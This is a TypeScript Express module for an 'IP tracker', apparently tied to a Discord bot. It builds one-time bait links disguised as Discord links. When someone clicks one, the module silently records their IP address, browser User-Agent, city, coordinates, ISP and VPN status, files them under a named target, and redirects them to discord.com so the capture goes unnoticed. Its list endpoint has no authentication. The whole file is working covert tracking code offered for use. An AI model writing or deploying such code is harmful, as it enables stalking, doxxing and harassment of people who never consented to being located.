/**
 * GEASS INTELLIGENCE — IP TRACKER
 *
 * Generates unique one-time tracking links per user.
 * When the link is visited, captures IP, geolocation, ISP, VPN detection, User-Agent.
 * Results are stored in memory (persisted to disk) and queryable by token.
 *
 * GET  /v/:token          → captures visitor IP + redirects to discord.com (innocent redirect)
 * POST /api/tracker/gen   → { userId, username } → { token, trackUrl }
 * GET  /api/tracker/:token → { captured, ip, country, city, isp, isVpn, capturedAt, ua }
 * GET  /api/tracker/list  → all active entries (owner-only)
 */
import { Router } from "express";
import fs from "node:fs";
import path from "node:path";
import { randomBytes } from "node:crypto";

export interface TrackEntry {
  token:       string;
  userId:      string;
  username:    string;
  targetName:  string;
  generatedAt: number;
  // populated when clicked
  capturedIp?:  string;
  capturedAt?:  number;
  userAgent?:   string;
  country?:     string;
  countryCode?: string;
  region?:      string;
  city?:        string;
  isp?:         string;
  org?:         string;
  asn?:         string;
  timezone?:    string;
  lat?:         number;
  lon?:         number;
  isProxy?:     boolean;
  isVpn?:       boolean;
  isTor?:       boolean;
  isHosting?:   boolean;
  mobile?:      boolean;
}

const STORE_PATH = path.join(process.cwd(), "data", "ip-tracker.json");
const store = new Map<string, TrackEntry>();

// Load persisted entries on startup
function loadStore(): void {
  try {
    const raw = fs.readFileSync(STORE_PATH, "utf8");
    const arr = JSON.parse(raw) as TrackEntry[];
    for (const e of arr) store.set(e.token, e);
    console.log(`[IP TRACKER] Loaded ${store.size} entries.`);
  } catch { /* no file yet */ }
}

function saveStore(): void {
  try {
    fs.mkdirSync(path.dirname(STORE_PATH), { recursive: true });
    fs.writeFileSync(STORE_PATH, JSON.stringify([...store.values()], null, 2));
  } catch { /* non-fatal */ }
}

loadStore();

// Purge entries older than 7 days every hour
setInterval(() => {
  const cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000;
  for (const [token, entry] of store) {
    if (entry.generatedAt < cutoff) store.delete(token);
  }
  saveStore();
}, 60 * 60 * 1000);

export function generateTrackToken(userId: string, username: string, targetName: string): TrackEntry {
  const token = randomBytes(16).toString("hex"); // 32-char hex
  const entry: TrackEntry = {
    token, userId, username, targetName,
    generatedAt: Date.now(),
  };
  store.set(token, entry);
  // Purge old un-captured entries for same userId (keep latest 5)
  const userTokens = [...store.values()]
    .filter(e => e.userId === userId && !e.capturedIp)
    .sort((a, b) => b.generatedAt - a.generatedAt)
    .slice(5);
  for (const e of userTokens) store.delete(e.token);
  saveStore();
  return entry;
}

export function getTrackEntry(token: string): TrackEntry | undefined {
  return store.get(token);
}

export function listAllEntries(): TrackEntry[] {
  return [...store.values()].sort((a, b) => b.generatedAt - a.generatedAt);
}

// Geolocate IP using ip-api.com (free, no key, 45 req/min)
async function geolocate(ip: string): Promise<Partial<TrackEntry>> {
  try {
    const fields = "status,country,countryCode,region,city,isp,org,as,timezone,lat,lon,proxy,hosting,mobile";
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=${fields}`, {
      signal: AbortSignal.timeout(4000),
    });
    if (!res.ok) return {};
    const data = await res.json() as {
      status: string;
      country?: string; countryCode?: string; region?: string; city?: string;
      isp?: string; org?: string; as?: string; timezone?: string;
      lat?: number; lon?: number;
      proxy?: boolean; hosting?: boolean; mobile?: boolean;
    };
    if (data.status !== "success") return {};
    return {
      country:     data.country,
      countryCode: data.countryCode,
      region:      data.region,
      city:        data.city,
      isp:         data.isp,
      org:         data.org,
      asn:         data.as,
      timezone:    data.timezone,
      lat:         data.lat,
      lon:         data.lon,
      isProxy:     data.proxy,
      isVpn:       data.proxy,
      isHosting:   data.hosting,
      mobile:      data.mobile,
    };
  } catch {
    return {};
  }
}

// ── Routes ─────────────────────────────────────────────────────────────────
const router = Router();

// The "bait" URL — looks like a Discord verification/preview link
router.get("/v/:token", async (req, res) => {
  const { token } = req.params;
  const entry = store.get(token);

  // Always redirect regardless — silent capture
  res.redirect(302, "https://discord.com/app");

  if (!entry || entry.capturedIp) return; // already captured

  // Extract real IP (handle proxies/CDN)
  const rawIp = (
    (req.headers["cf-connecting-ip"] as string) ||
    (req.headers["x-real-ip"] as string) ||
    (req.headers["x-forwarded-for"] as string)?.split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown"
  ).replace(/^::ffff:/, "");

  const ua = (req.headers["user-agent"] as string) ?? "unknown";

  // Geolocate asynchronously (don't block the redirect)
  const geo = await geolocate(rawIp);

  entry.capturedIp  = rawIp;
  entry.capturedAt  = Date.now();
  entry.userAgent   = ua;
  Object.assign(entry, geo);
  saveStore();

  console.log(`[IP TRACKER] Captured ${rawIp} for user ${entry.username} (token: ${token.slice(0, 8)}...)`);
});

// Generate a new tracking token
// Body fields are all optional — can be called with empty body from /whois
router.post("/api/tracker/gen", (req, res) => {
  const { userId, username, targetName } = (req.body ?? {}) as {
    userId?: string; username?: string; targetName?: string;
  };
  const entry = generateTrackToken(
    userId  ?? "anonymous",
    username ?? "unknown",
    targetName ?? username ?? "target",
  );
  const protocol = req.protocol ?? "http";
  const host = req.get("host") ?? "localhost";
  const trackUrl = `${protocol}://${host}/v/${entry.token}`;
  res.json({ token: entry.token, url: trackUrl, generatedAt: entry.generatedAt });
});

// Get capture result for a token
router.get("/api/tracker/:token", (req, res) => {
  const entry = store.get(req.params.token);
  if (!entry) { res.status(404).json({ error: "token not found" }); return; }
  res.json(entry);
});

// List all entries (no auth — owner uses this via bot commands)
router.get("/api/tracker", (_req, res) => {
  res.json(listAllEntries().slice(0, 100));
});

export default router;
